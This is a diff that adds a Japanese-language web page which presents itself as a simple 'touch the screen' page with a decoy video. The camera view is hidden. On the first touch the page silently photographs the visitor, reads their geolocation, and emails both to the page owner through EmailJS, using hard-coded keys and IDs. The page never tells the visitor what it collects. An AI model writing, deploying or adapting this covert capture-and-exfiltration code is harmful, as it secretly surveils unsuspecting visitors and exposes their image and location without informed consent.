@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>画面タッチで撮影・送信</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #222;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    video, canvas {
+      display: none;
+    }
+    #message {
+      margin-top: 2rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>画面に触れてください</h1>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <div id="message">カメラを起動中...</div>
+
+  <!-- Base64動画表示 -->
+  <video id="localVideo" controls autoplay loop muted width="300"></video>
+
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    emailjs.init("cPjKBUm_i6HebDQF7"); // ← あなたの公開鍵に設定済み
+  </script>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const message = document.getElementById('message');
+    const localVideo = document.getElementById('localVideo');
+
+    // ▶️ Base64動画（デモ：1秒黒い画面） ← 必要に応じて差し替え可
+    const base64Video = "data:video/mp4;base64,AAAAHGZ0eXBpc29tAAACAGlzb21pc28yYXZjMQAAAAhmcmVlAAACkG1kYXQhZ...（省略）";
+    localVideo.src = base64Video;
+
+    // 📷 カメラ起動
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        message.textContent = "画面をタップしてください";
+      })
+      .catch(err => {
+        message.textContent = "カメラアクセス失敗: " + err.message;
+      });
+
+    // 👆 タッチ・クリックイベント
+    document.body.addEventListener('touchstart', handleInteraction, { once: true });
+    document.body.addEventListener('mousedown', handleInteraction, { once: true });
+
+    async function handleInteraction() {
+      message.textContent = "処理中...";
+
+      // 📸 写真を撮影
+      await new Promise(resolve => setTimeout(resolve, 500)); // タイミング調整
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const photoData = canvas.toDataURL("image/png");
+
+      // 📍 位置情報取得
+      const position = await getLocation();
+      const locationText = position
+        ? `緯度: ${position.coords.latitude}, 経度: ${position.coords.longitude}`
+        : "位置情報の取得に失敗しました";
+
+      // 📤 EmailJSで送信
+      emailjs.send("service_ja2c09x", "template_2fp2jrg", {
+        message: `画面がタッチされました。\n${locationText}`,
+        image_data: photoData
+      }).then(() => {
+        message.textContent = "送信成功！";
+      }).catch(err => {
+        message.textContent = "送信エラー: " + err.text;
+      });
+    }
+
+    // 🌍 位置情報取得関数
+    function getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve(null);
+        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null));
+      });
+    }
+  </script>
+</body>
+</html>
